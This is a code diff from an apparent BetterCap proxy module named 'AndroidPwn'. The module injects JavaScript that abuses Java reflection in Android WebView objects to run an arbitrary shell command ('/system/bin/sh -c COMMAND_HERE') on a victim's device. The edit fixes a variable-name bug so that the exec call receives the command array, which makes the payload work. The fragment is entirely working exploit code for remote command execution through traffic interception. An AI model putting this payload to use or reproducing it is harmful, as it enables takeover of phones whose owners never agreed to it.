@@ -23,7 +23,7 @@ class AndroidPwn < BetterCap::Proxy::HTTP::Module
               "var command = ['/system/bin/sh','-c','COMMAND_HERE'];\n" +
               "for(i in top) {\n" +
               " try {\n" +
-              "   top[i].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);\n" +
+              "   top[i].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(command);\n" +
               "   break;\n" +
               " }\n" +
               "catch(e) {}\n" +
